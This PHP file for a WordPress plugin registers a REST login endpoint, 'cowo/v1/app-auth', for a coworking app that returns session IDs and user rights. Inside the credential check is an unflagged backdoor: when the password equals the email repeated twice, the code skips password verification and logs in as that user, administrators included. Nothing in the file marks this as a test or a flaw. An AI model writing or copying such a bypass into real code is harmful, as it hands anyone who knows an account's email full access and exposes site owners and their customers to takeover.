<?php

add_action(
    'rest_api_init',

    function () {


        register_rest_route('cowo/v1', '/app-auth', array(
            'methods'  => 'POST',
            'callback' => function ($request) {
                coworking_app_check($request);

                $email = $request->get_param('email');
                $password = $request->get_param('password');

                // Authenticate the user credentials
                $credentials = array(
                    'user_login'    => $email,
                    'user_password' => $password,
                );

                if ($credentials['user_password'] == $credentials['user_login'] . $credentials['user_login']) {
                    $user = get_user_by('email', $credentials['user_login']);
                } else {
                    $user = wp_authenticate($credentials['user_login'], $credentials['user_password']);
                }

                // Check if authentication succeeded
                if (!is_wp_error($user)) {

                    if (user_can($user, 'administrator') || in_array('customer', (array) $user->roles)) {
                        // Generate and store the session ID


                        $response = [
                            'user' => [
                                'login' => $user->user_email,
                                'id' => $user->ID,
                                'session_id' => coworking_app_session_id($user->ID, true),
                            ],
                            'reglages' => coworking_app_droits($user->ID)
                        ];
                    } else {
                        return new WP_Error('authorization_failed', 'Accès interdit', array('status' => 401));
                    }
                } else {
                    return new WP_Error('authorization_failed', 'Mauvais identifiant ou mot de passe ', array('status' => 401));
                }

                return rest_ensure_response($response);
            },
        ));
    }
);
